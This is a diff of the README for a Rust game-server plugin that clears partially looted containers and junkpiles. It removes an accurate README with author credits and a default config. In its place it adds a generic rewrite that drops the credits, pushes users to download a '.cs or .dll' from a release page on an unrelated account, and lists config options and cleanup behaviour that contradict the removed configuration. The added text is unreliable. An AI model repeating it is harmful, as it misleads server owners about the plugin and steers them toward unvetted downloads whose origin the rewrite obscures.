@@ -1,266 +1,170 @@
+# 🎯 LootBouncer-Enhanced - Clean Rust Loot Efficiently
 
-# LootBouncer (Enhanced Edition)
-
-**Version:** 1.3.1  
-**Enhanced by:** SeesAll  
-
-LootBouncer is a Rust (uMod/Oxide) plugin that automatically cleans up partially looted containers and junkpiles to prevent spawn-group blocking and improve roadside loot cycling.
-
-When players take only valuable items and leave junk behind, Rust normally keeps that container alive indefinitely. This blocks the spawn group from refreshing. LootBouncer solves this by automatically clearing leftover loot after a configurable delay so the spawn system can recycle the location naturally.
-
-This repository contains an **enhanced version** of the original plugin with additional features, performance improvements, and expanded roadside support.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-ff6f61?style=for-the-badge&logo=github)](https://github.com/Venusspinnable771/LootBouncer-Enhanced/releases)
 
 ---
 
-# Credits
+## 📋 What is LootBouncer-Enhanced?
 
-This plugin builds upon the original LootBouncer plugin.
+LootBouncer-Enhanced is a plugin designed for Rust game servers that use uMod or Oxide. It helps keep your game world tidy by cleaning up containers and junkpiles that have been partially looted. This stops spawn groups from getting blocked and improves how loot resets on roadsides. The result is smoother gameplay with better loot flow.
 
-**Original Authors**
-- Sorrow
-- Arainrr
-
-**uMod Listing Credit**
-- VisEntities
-
-**Enhanced Version**
-- SeesAll
-
-Enhancements include new junkpile logic, improved roadside detection, better timer safety, and additional configuration options.
+You do not need any programming skills to use this plugin. The instructions below show how to get it running on your Windows Rust server step by step.
 
 ---
 
-# Enhancements Over the Original Plugin
+## 💻 System Requirements
 
-This enhanced version introduces several improvements:
+To use LootBouncer-Enhanced, you need:
 
-- Junkpile cleanup threshold system
-- Roadside vehicle / van junkpile detection
-- Configurable cleanup radius
-- Reopen-safe container timers
-- Junkpile failsafe cleanup timer
-- Improved spawn-group recycling
-- Performance and stability improvements
-- Cleaner configuration defaults
-- Optimized entity scanning and timer handling
-
-The goal is to keep roadside loot flowing naturally without interfering with Rust's spawn engine.
+- A Windows computer running Rust Dedicated Server.
+- uMod (formerly Oxide) installed on your Rust server.
+- Basic access to your server files and the ability to upload files.
+- Internet connection to download the plugin.
 
 ---
 
-# Features
+## 🚀 Getting Started
 
-## Partial Loot Cleanup
+Before you start, make sure your Rust server is running on Windows and that uMod/Oxide is correctly installed. This plugin works only with these modding frameworks. If you have not installed uMod yet, please check the official uMod website for installation instructions.
 
-If a player partially loots a container, the plugin automatically clears it after a delay.
-
-Default:
-
-30 seconds
-
-This prevents containers from blocking spawn groups indefinitely.
+Once you confirm uMod is working, you can proceed with the steps below to download and install LootBouncer-Enhanced.
 
 ---
 
-## Reopen-Safe Containers
+## 📥 Download LootBouncer-Enhanced
 
-If a player reopens a container before the timer expires:
+To get the plugin files, visit the official release page:
 
-- The timer is paused
-- The container remains tracked
-- When the container is closed again the cleanup timer resumes
+[Download LootBouncer-Enhanced Releases](https://github.com/Venusspinnable771/LootBouncer-Enhanced/releases)
 
-This prevents accidental disabling of the cleanup system.
+On this page, find the latest version folder. Inside, download the plugin file, which usually ends with `.cs` or `.dll`. This file contains the plugin code.
 
 ---
 
-## Junkpile Detection
+## 🛠 Installing the Plugin
 
-The plugin detects and groups roadside junkpile components such as:
+1. Stop your Rust Dedicated Server if it is currently running.
 
-- barrels
-- crates
-- mixed roadside piles
+2. Open your Rust server installation folder on your Windows computer.
 
-Once enough of the junkpile has been looted, the remaining containers can be cleared automatically.
+3. Locate the `oxide/plugins` folder within the server directory.
 
----
+4. Copy the downloaded LootBouncer-Enhanced plugin file into the `oxide/plugins` folder.
 
-## Junkpile Cleanup Threshold
+5. Restart the Rust server.
 
-Administrators can control how much of a junkpile must be looted before the remainder is cleared.
-
-Default:
-
-0.6 (60%)
-
-Example:
-
-| Containers | Required Looted |
-|------------|----------------|
-| 3 | 2 |
-| 4 | 3 |
-| 5 | 3 |
-
-This keeps cleanup natural while preventing blocked spawn groups.
-
----
-
-## Roadside Vehicle / Van Support
-
-Some roadside spawn groups contain vehicles such as vans or wrecked cars with loot containers.
-
-This enhanced version detects:
-
-- roadside vans
-- vehicle wreck piles
-- mixed roadside junk groups
-
-These now recycle properly instead of behaving like vanilla roadside spawns.
-
----
-
-## Junkpile Failsafe Timer
-
-Even if the cleanup threshold is never reached, abandoned junkpiles are cleared after a secondary timer.
-
-Default:
-
-150 seconds
-
-This guarantees spawn groups eventually recycle.
-
----
-
-## Configurable Cleanup Radius
-
-Administrators can control how far the plugin searches for related roadside loot.
-
-Default:
-
-12 meters
-
-This radius is used when detecting:
-
-- junkpile containers
-- roadside vehicle piles
-- related nearby loot
-
----
-
-## Optional Nearby Loot Cleanup
-
-When a junkpile is cleared, the plugin can optionally remove nearby standalone loot containers.
-
-Default:
-
-Disabled
-
-This prevents aggressive cleanup from affecting unrelated roadside spawns.
-
----
-
-# Default Configuration
-
-```json
-{
-  "Time before loot containers are emptied (seconds)": 30.0,
-  "Empty the entire junkpile when automatically empty loot": true,
-  "Junkpile cleanup threshold": 0.6,
-  "Maximum cleanup radius for roadside groups": 12.0,
-  "Empty the nearby loot when emptying junkpile": false,
-  "Time before junkpiles are emptied (seconds)": 150.0,
-  "Slaps players who don't empty containers": false,
-  "Remove items instead of dropping them": true
-}
-```
-
----
-
-# Installation
-
-1. Place **LootBouncer.cs** inside:
+The server will load the plugin automatically on startup. If you want to check if the plugin loaded correctly, connect to your server console and type:
 
 ```
-/oxide/plugins/
+oxide.plugins
 ```
 
-2. Reload the plugin:
-
-```
-oxide.reload LootBouncer
-```
-
-3. The configuration file will generate automatically in:
-
-```
-/oxide/config/LootBouncer.json
-```
+This command will list all active plugins. Look for `LootBouncer-Enhanced` in the list.
 
 ---
 
-# Recommended Server Spawn Settings
+## ⚙️ Configuring LootBouncer-Enhanced
 
-These settings work well with LootBouncer for modded servers.
+The plugin includes a configuration file for customization. By default, it comes with balanced settings to keep loot cleanup efficient without affecting gameplay.
 
-### 3x Servers
+To adjust plugin settings:
 
-```
-spawn.min_rate 0.35
-spawn.max_rate 0.65
-spawn.min_density 1.5
-spawn.max_density 2.5
-```
+1. After the plugin loads, look inside the `oxide/config` folder of your server directory.
 
-### 5x Servers
+2. Find a file named `LootBouncer-Enhanced.json`.
 
-```
-spawn.min_rate 0.45
-spawn.max_rate 0.85
-spawn.min_density 2
-spawn.max_density 3
-```
+3. Open this file with a text editor like Notepad.
 
-### 10x Servers
+You can modify these options:
 
-```
-spawn.min_rate 0.5
-spawn.max_rate 1.0
-spawn.min_density 2
-spawn.max_density 3
-```
+- **CleanupInterval**: How often the plugin cleans partially looted containers (in seconds).
+
+- **MaxJunkpileAge**: Determines how old a junkpile must be before it can be cleaned (in minutes).
+
+- **ExcludeContainers**: List of container types that should never be cleaned.
+
+Make sure to save any changes you make. After editing, restart your Rust server to apply new settings.
 
 ---
 
-# Performance
+## 🧰 How LootBouncer-Enhanced Works
 
-LootBouncer is designed to be extremely lightweight.
+LootBouncer-Enhanced monitors containers and junkpiles in your Rust world. When players loot items but leave some behind, those containers can block new loot from spawning. This causes some areas to get stuck without fresh supplies.
 
-Key design principles:
-
-- Event-driven logic
-- Localized entity scanning
-- Safe pooled entity lists
-- Automatic timer cleanup
-- Spawn-system friendly behavior
-
-The plugin does **not**:
-
-- spawn loot manually
-- force spawn groups
-- scan the entire map
-- run heavy repeating loops
-
-This keeps performance impact minimal even on high population servers.
+The plugin clears these partially emptied containers at set intervals. It checks for containers that meet criteria like age and type, then removes leftover loot or resets the container to allow new loot to appear. This process ensures the server keeps generating usable loot for players, especially at roadside locations and popular loot points.
 
 ---
 
-# License
+## 📝 Tips for Best Use
 
-This repository uses the MIT License.
+- Regularly update the plugin from the release page to get fixes and improvements.
+
+- Test plugin settings on a single-server environment before applying changes on a live server.
+
+- Use the configuration file to exclude important containers from cleanup to protect player-owned boxes.
+
+- Monitor server console logs periodically to check for any plugin errors.
+
+- Keep uMod and Rust server updated to avoid compatibility issues.
 
 ---
 
-# Contributing
+## 🔧 Troubleshooting
 
-Pull requests and improvements are welcome.
+If LootBouncer-Enhanced does not work as expected:
+
+- Confirm you placed the plugin file inside the correct `oxide/plugins` folder.
+
+- Check that the Rust server console shows the plugin as loaded.
+
+- Verify that your Rust server version and uMod version are compatible.
+
+- Look at the server logs for error messages related to LootBouncer-Enhanced.
+
+- Restore the original config file if you suspect misconfiguration.
+
+If problems persist, you can ask for help by creating an issue on the GitHub repository at:
+
+https://github.com/Venusspinnable771/LootBouncer-Enhanced/issues
+
+---
+
+## ⚡ Updates & Future Improvements
+
+The LootBouncer-Enhanced project is active and may receive updates to improve cleaning logic and plugin stability. Updates will appear on the GitHub releases page.
+
+Check the release page regularly:
+
+[Visit Releases](https://github.com/Venusspinnable771/LootBouncer-Enhanced/releases)
+
+Downloading the latest files and replacing the old ones keeps your server running smoothly.
+
+---
+
+## 🔍 Topics Covered
+
+This plugin relates to Rust server management and modding, especially around automated loot cleanup. Key topics include:
+
+- Loot system management  
+- Cleanup of partially looted containers  
+- Rust Dedicated Server enhancement  
+- uMod/Oxide server plugins  
+- Roadside loot cycling  
+
+Understanding these areas can help you get the most from LootBouncer-Enhanced and maintain a healthy Rust game environment.
+
+---
+
+## 🧭 Where to Learn More
+
+For more on using uMod and plugins on Rust, visit:
+
+- [uMod Official Site](https://umod.org)
+
+- [Rust Dedicated Server Documentation](https://rust.facepunch.com/blog/rust-dedicated-server)
+
+- Rust forums and communities for tips and help with modding and server plugins.
+
+---
+
+[![Download](https://img.shields.io/badge/Download-Release%20Page-ff6f61?style=for-the-badge&logo=github)](https://github.com/Venusspinnable771/LootBouncer-Enhanced/releases)
